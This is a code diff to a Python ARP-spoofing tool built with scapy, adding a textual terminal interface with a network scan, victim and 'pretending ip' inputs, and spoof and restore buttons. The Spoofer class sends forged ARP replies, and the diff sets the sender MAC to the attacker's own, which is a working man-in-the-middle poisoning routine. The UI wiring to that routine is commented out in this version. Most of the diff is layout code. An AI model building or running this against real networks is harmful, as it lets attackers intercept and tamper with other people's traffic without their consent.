@@ -1,8 +1,8 @@
 from scapy.all import *
 from scapy.layers.l2 import ARP
 from textual.app import App, ComposeResult
-from textual.containers import Horizontal, VerticalScroll
-from textual.widgets import Header, Footer, Input, Button, DataTable
+from textual.containers import Horizontal, VerticalScroll, Container, Vertical
+from textual.widgets import Header, Footer, Input, Button, DataTable, Static, Label
 from textual._on import *
 
 class Spoofer:
@@ -67,6 +67,8 @@ class Spoofer:
                     break
             if not info:
                 info = "Unknown"
+            if device["ip"][::-1][:2] == "1.":
+                info = "Network Device"
             device["os"] = info
             print(info)
             device["mac"] = received.hwsrc
@@ -81,7 +83,7 @@ class Spoofer:
         return None
 
     def spoof(self, pretending_ip, victim_ip):
-        packet = ARP(op=2, hwdst=self.get_mac(victim_ip), pdst=victim_ip, psrc=pretending_ip)
+        packet = ARP(op=2, hwdst=self.get_mac(victim_ip), pdst=victim_ip, psrc=pretending_ip, hwsrc=self.my_mac)
         send(packet, verbose=False)
     def restore(self, pretending_ip, victim_ip):
         packet = ARP(op=2, hwsrc=self.get_mac(pretending_ip), hwdst=self.get_mac(victim_ip), pdst=victim_ip, psrc=pretending_ip)
@@ -92,44 +94,120 @@ class Spoofer:
 
 
 
+class RestoreButton(Button):
+    def __init__(self, number_for_delete, v_ip, p_ip, **kwargs):
+        super().__init__(**kwargs)
+        self.v_ip = v_ip
+        self.p_ip = p_ip
+        self.number_for_delete = number_for_delete
+
+
+
 
 class SpoofApp(App):
     CSS = """
         Input {
-            width: 40%;
+            width: 50%;
         }
         
         Button {
-            width: 10%;
+            
         }
         
         Horizontal {
+            margin-left: 5;
             margin-top: 1;
-            dock: top;
+            margin-bottom: 1;
+            
             height: auto; 
 
         }
-        
-        #d_table {
-            margin-left: 30;
-            margin-top: 3;
-            width: auto;
+        #ips {
+            width: 50%;
+            height: auto;
         }
         
+        #info_container {
+            margin-left: 20;
+        }
+        
+        Vertical {
+            margin-bottom: 3;
+            margin-top: 1;
+            
+            border: dodgerblue;
+            width: 40%;
+            overflow-y: auto; 
+            overflow-x: auto;
+        }
+        
+        #d_table {
+            margin-left: 10;
+            margin-top: 2;
+            width: auto;
+        }
+            
+        #horizontal {
+            width: 100%;
+            
+        }
+        
+        #victim {
+            width: 100%;
+        }
+        
+        #pretending {
+            width: 100%;
+        }
+        
+        #spoof {
+        margin-top: 2;
+            margin-left: 8;
+        }
+        
+        #vertical_right {
+            width: 1fr;
+            margin-right: 5;
+            margin-top: 1;
+        }
+        
+        
+        #restore {
+            margin-left: 5;
+        }
+        
+        #spoof_info {
+            margin-top: 1;
+        }
         
         """
 
     def __init__(self):
         super().__init__()
         self.spoofer = Spoofer()
+        self.info_count = 0
 
 
     def compose(self) -> ComposeResult:
-        yield(Horizontal(
-         Input(placeholder="Limit ip", type="integer", id="limit"),
-         Button("scan", id="enter_limit"))
+        with Horizontal(id="horizontal"):
+
+            yield Vertical(Horizontal(
+         Input(placeholder="Limit ip range", type="integer", id="limit"),
+                Button("scan", id="enter_limit"))
+            ,DataTable(id="d_table")
         )
-        yield(DataTable(id="d_table"))
+
+
+            with Vertical(id="vertical_right"):
+                    with Horizontal():
+                        with Container(id="ips"):
+                            yield Input(placeholder="victim ip", id="victim")
+                            yield Input(placeholder="pretending ip", id="pretending")
+
+
+                        yield Button("spoof", id="spoof")
+
+                    yield VerticalScroll(Container(id="info_container"))
 
     @on(Button.Pressed, "#enter_limit")
     async def on__b_enter_limit(self) -> None:
@@ -150,6 +228,33 @@ class SpoofApp(App):
         data_table.add_column("os")
         for i in device_list:
             data_table.add_row(i["ip"], i["mac"], i["os"])
+
+    @on(Button.Pressed, "#spoof")
+    async def on__b_spoof(self) -> None:
+        self.run_worker(self.spoof(), exclusive=True)
+
+    async def spoof(self):
+        v_ip = str(self.query_one("#victim", Input).value)
+        p_ip = str(self.query_one("#pretending", Input).value)
+        # self.spoofer.spoof(v_ip, p_ip)
+        container = self.query_one("#info_container", Container)
+        horizontal = Horizontal(id="horizontal_info" + str(self.info_count))
+
+        horizontal.compose_add_child(Label(f"for {v_ip} you're {p_ip}", id="spoof_info"))
+        horizontal.compose_add_child(RestoreButton(self.info_count, v_ip, p_ip, label="restore", id="restore"))
+        self.info_count += 1
+        await container.mount(horizontal)
+
+    async def on_button_pressed(self, event: Button.Pressed) -> None:
+        button = event.button
+        if button.id == "restore":
+            button.__class__ = RestoreButton
+            self.run_worker(self.restore(button.number_for_delete, button.v_ip, button.p_ip), exclusive=True)
+
+    async def restore(self, delete, v_ip, p_ip):
+        # self.spoofer.restore(v_ip, p_ip)
+        horizontal_info = self.query_one("#horizontal_info" + str(delete), Horizontal)
+        await horizontal_info.remove()
 
 
 
